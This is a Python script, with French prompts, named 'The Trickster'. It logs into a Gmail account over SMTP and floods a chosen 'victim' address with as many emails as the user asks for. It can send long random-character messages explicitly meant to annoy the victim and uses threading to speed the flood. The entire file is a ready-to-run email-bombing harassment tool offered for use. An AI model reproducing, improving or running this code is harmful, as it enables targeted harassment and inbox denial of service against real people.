# -*- coding: utf-8 -*-

from os import name, system
from time import sleep
from smtplib import SMTP_SSL
from email.message import EmailMessage
from threading import Thread
from random import choice

if name == 'nt':
    system("title The Trickster")
    system("mode 120, 30")

def clear():
    system("cls" if name == 'nt' else "clear")

def jump():
    print()



clear()



valid = "[\033[38;2;0;255;0m!\033[38;2;255;255;255m]"
invalid = "[\033[38;2;255;0;0m!\033[38;2;255;255;255m]"

strings = [string for string in r"""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""]
sent = 0
time = 0
done = False


def chrono():
    global time, done
    
    while True:
        if done: 
            exit()
        sleep(1)
        time += 1




try:
    from pyfade import Fade, Colors
    from pycenter import center

except ImportError:
    input(invalid + " Les modules nécessaires ne sont pas installées!")
    jump()
    input(invalid + " Installez les modules 'pyfade' et 'pycenter' puis réessayez!")
    exit()








trickster = """
   ▄▄▄▄▀ ▄  █ ▄███▄          ▄▄▄▄▀ █▄▄▄▄ ▄█ ▄█▄    █  █▀  ▄▄▄▄▄      ▄▄▄▄▀ ▄███▄   █▄▄▄▄ 
▀▀▀ █   █   █ █▀   ▀      ▀▀▀ █    █  ▄▀ ██ █▀ ▀▄  █▄█   █     ▀▄ ▀▀▀ █    █▀   ▀  █  ▄▀ 
    █   ██▀▀█ ██▄▄            █    █▀▀▌  ██ █   ▀  █▀▄ ▄  ▀▀▀▀▄       █    ██▄▄    █▀▀▌  
   █    █   █ █▄   ▄▀        █     █  █  ▐█ █▄  ▄▀ █  █ ▀▄▄▄▄▀       █     █▄   ▄▀ █  █  
  ▀        █  ▀███▀         ▀        █    ▐ ▀███▀    █              ▀      ▀███▀     █   
          ▀                         ▀               ▀                               ▀ """

billy = "| billythegoat356 |"


trickster = center(trickster)
billy = center(billy)


def main():
    clear()
    print(Fade.Vertical(Colors.white_to_black, trickster))
    print(billy)
    jump()
    jump()


main()

mail = input("[?] Entrez votre adresse mail > ")
password = input("[?] Entrez votre mot de passe > ")

jump()

try:
    with SMTP_SSL('smtp.gmail.com',465) as smtp:
        smtp.login(mail, password)
except:
    input(invalid + " Vos informations de connexion sont invalides, ou vous n'avez pas activé le mode 'applications non-sécurisées' dans votre compte Google.")
    exit()


print(valid + " Connexion à votre compte réussie!")

victim = input("[?] Entrez l'adresse mail que vous voulez spam > ")
spam = input("[?] Entrez le nombre de mails que vous voulez envoyer > ")

jump()

try:
    spam = int(spam)
except:
    input(invalid + " Le nombre doit être un integer!")
    exit()


boom = input("[y/n] Voulez-vous envoyer des mails longs aléatoires pour ennuyer la victime? ")

if boom not in ['y', 'n']:
    jump()
    input(invalid + " La réponse doit être [y/n]!")
    exit()

if boom == 'n':
    jump()
    subject = input("[?] Entrez le sujet du mail > ")
    content = input("[?] Entrez le contenu du mail > ")
else:
    subject = ""
    content = ""

jump()

multi = input("[y/n] Voulez-vous utiliser du threading, pour réduire le délai entre l'envoi des mails? ")

jump()


if multi not in ['y', 'n']:
    jump()
    input(invalid + " La réponse doit être [y/n]!")
    exit()


main()

Thread(target=chrono).start()

def send(i):
    global subject, content, boom, strings, sent, done


    with SMTP_SSL('smtp.gmail.com',465) as smtp:
        if boom == 'n':
            subject += "ㅤ"
            content += "ㅤ"
        else:
            subject = "".join(choice(strings) for _ in range(100))
            content = "".join(choice(strings) for _ in range(10000))

        msg = EmailMessage()
        msg['subject'] = subject
        msg['from'] = mail
        msg['to'] = victim
        msg.set_content(content)

        try:
            smtp.login(mail, password)

            smtp.send_message(msg)
            print(valid, "Mail numéro " + str((i + 1)) + "/" + str(spam) + " envoyé!")

            sent += 1
        except:
            print(invalid, "Erreur lors de l'envoi du mail numéro " + str((i + 1)) + "/" + str(spam) + "!")
        
        if i + 1 == spam:
            done = True


for i in range(spam):
    if multi == 'y':
        Thread(target=send, args=(i,)).start()
        sleep(0.25)
    else:
        send(i)

while True:
    if done:
        sleep(3)
        main()
        input(valid + f" {sent} mails ont été envoyés avec succés, en {str(time)} secondes!")
        jump()
        input(valid + " Appuyez sur entrée pour quitter...")
        exit()